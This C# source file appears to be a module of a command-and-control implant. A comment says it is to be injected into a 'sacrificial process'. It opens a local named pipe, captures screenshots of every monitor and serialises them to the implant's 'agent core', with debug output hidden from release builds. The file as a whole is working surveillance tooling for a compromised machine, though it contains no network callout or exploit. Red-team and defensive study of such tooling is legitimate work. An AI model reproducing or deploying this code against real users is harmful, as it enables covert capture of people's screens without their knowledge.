using System;
using System.IO.Pipes;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.AccessControl;
using IPC;
using System.IO;
using System.Drawing;
using System.Windows.Forms;
using System.Collections.Generic;



// Inject this assembly into the sacrificial process
namespace ScreenshotRunner
{
    public class Program
    {
        static BinaryFormatter bf = new BinaryFormatter();
        public static NamedPipeServerStream CreateNamedPipeServer(string pipeName)
        {
            PipeSecurity pipeSecurityDescriptor = new PipeSecurity();
            PipeAccessRule everyoneAllowedRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
            PipeAccessRule networkDenyRule = new PipeAccessRule("Network", PipeAccessRights.ReadWrite, AccessControlType.Deny);       // This should only be used locally, so lets limit the scope
            pipeSecurityDescriptor.AddAccessRule(everyoneAllowedRule);
            pipeSecurityDescriptor.AddAccessRule(networkDenyRule);

            // Gotta be careful with the buffer sizes. There's a max limit on how much data you can write to a pipe in one sweep. IIRC it's ~55,000, but I dunno for sure.
            NamedPipeServerStream pipeServer = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 32768, 32768, pipeSecurityDescriptor);

            return pipeServer;
        }


        public static void InitializeNamedPipeServer(string pipeName)
        {
            NamedPipeServerStream pipeServer = null;

            try
            {
                pipeServer = CreateNamedPipeServer(pipeName);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("ERROR: Could not start named pipe server. " + e.Message);
#endif
            }

            if (pipeServer == null)
            {
                KillJob(JobExitCode.PipeStartError);
            }

            try
            {
#if DEBUG
                Console.WriteLine("Pipe: " + pipeName + " Ready To Go!");
#endif
                // We shouldn't need to go async here since we'll only have one client, the agent core, and it'll maintain the connection to the named pipe until the job is done
                pipeServer.WaitForConnection();
#if DEBUG
                Console.WriteLine("Connection received to pipe.");
#endif
            }
            catch (Exception e)
            {
                pipeServer.Close();
                return;
            }

            using (StreamWriter writer = new StreamWriter(pipeServer))
            {
                writer.AutoFlush = true;

                BinaryFormatter bf = new BinaryFormatter();
                bf.Binder = new ScreenshotMessageBinder();

                List<ScreenshotMessage> screenshotMsgs = new List<ScreenshotMessage>();

                foreach (Screen screen in Screen.AllScreens)
                {
                    ScreenshotMessage msg = new ScreenshotMessage();

                    try
                    {
                        msg.Capture = GetScreenshot(screen);
                    }

                    catch (Exception e)
                    {
                        msg.ErrorMessage = e.ToString();
                    }

                    screenshotMsgs.Add(msg);
                }

#if DEBUG
                Console.WriteLine("Sending Screenshots Over Pipe...");
#endif

                foreach (ScreenshotMessage msg in screenshotMsgs)
                {
                    bf.Serialize(pipeServer, msg);
                }
#if DEBUG
                Console.WriteLine("Sending Termination Message Over Pipe...");
#endif
                bf.Serialize(pipeServer, new ScreenshotTerminationMessage());
            }
#if DEBUG
            Console.WriteLine("Waiting for client to close pipe connection...");
#endif
            while (pipeServer.IsConnected) { };
            
        }

        //Console.WriteLine("Exiting loader stub...");


        public static byte[] GetScreenshot(Screen screen)
        {
#if DEBUG
            Console.WriteLine("Grabbing Screenshot...");
#endif

            byte[] screenshot = null;

            using (Bitmap bmpScreenCapture = new Bitmap(screen.Bounds.Width,
                                            screen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                {
                    g.CopyFromScreen(screen.Bounds.X,
                                        screen.Bounds.Y,
                                        0, 0,
                                        bmpScreenCapture.Size,
                                        CopyPixelOperation.SourceCopy);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        bmpScreenCapture.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        screenshot = ms.ToArray();
                    }
                }
            }

            return screenshot;
        }



        static void Main(string[] args)
        {
        }

        private static void KillJob(JobExitCode exitCode)
        {
            Environment.Exit((int)exitCode);
        }
    }
}

